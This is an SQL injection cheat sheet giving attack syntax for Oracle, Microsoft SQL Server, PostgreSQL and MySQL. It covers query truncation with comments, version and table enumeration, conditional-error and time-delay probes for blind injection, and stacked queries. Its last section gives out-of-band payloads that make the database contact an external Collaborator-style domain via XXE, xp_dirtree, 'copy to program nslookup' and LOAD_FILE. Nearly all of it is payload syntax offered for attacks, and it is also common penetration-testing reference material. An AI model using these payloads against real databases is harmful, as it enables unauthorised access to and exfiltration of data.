## various sql server syntax cheat sheet

cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

### String concatenation
You can concatenate together multiple strings to make a single string.

db | syntax
---|------
Oracle |	'foo'||'bar'
Microsoft |	'foo'+'bar'
PostgreSQL |	'foo'||'bar'
MySQL |	'foo' 'bar' [Note the space between the two strings] CONCAT('foo','bar')


### Substring
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.

db | syntax
---|------
Oracle |	SUBSTR('foobar', 4, 2)
Microsoft |	SUBSTRING('foobar', 4, 2)
PostgreSQL |	SUBSTRING('foobar', 4, 2)
MySQL |	SUBSTRING('foobar', 4, 2)


### Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.

db | syntax
---|------
Oracle |	--comment
Microsoft |	--comment or /*comment*/
PostgreSQL |	--comment or /*comment*/
MySQL |	#comment or -- comment [Note the space after the double dash] or /*comment*/


### Database version
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

db | syntax
---|------
Oracle |	SELECT banner FROM v$version or	SELECT version FROM v$instance
Microsoft |	SELECT @@version
PostgreSQL |	SELECT version()
MySQL |	SELECT @@version


### Database contents
You can list the tables that exist in the database, and the columns that those tables contain.

db | syntax
---|------
Oracle |	SELECT * FROM all_tables or SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft |	SELECT * FROM information_schema.tables or SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL |	SELECT * FROM information_schema.tables or SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL |	SELECT * FROM information_schema.tables or SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'


### Conditional errors
You can test a single boolean condition and trigger a database error if the condition is true.

db | syntax
---|------
Oracle |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
Microsoft |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
MySQL |	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')


### Batched (or stacked) queries
You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

db | syntax
---|------
Oracle |	Does not support batched queries.
Microsoft |	QUERY-1-HERE; QUERY-2-HERE
PostgreSQL |	QUERY-1-HERE; QUERY-2-HERE
MySQL |	QUERY-1-HERE; QUERY-2-HERE


### Time delays
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

db | syntax
---|------
Oracle |	dbms_pipe.receive_message(('a'),10)
Microsoft |	WAITFOR DELAY '0:0:10'
PostgreSQL |	SELECT pg_sleep(10)
MySQL |	SELECT sleep(10)


### Conditional time delays
You can test a single boolean condition and trigger a time delay if the condition is true.

db | syntax
---|------
Oracle |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft |	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL |	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL |	SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')


### DNS lookup
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

db | syntax
---|------
Oracle |	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual

The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
Microsoft |	exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
PostgreSQL |	copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
MySQL |	The following techniques work on Windows only:
LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
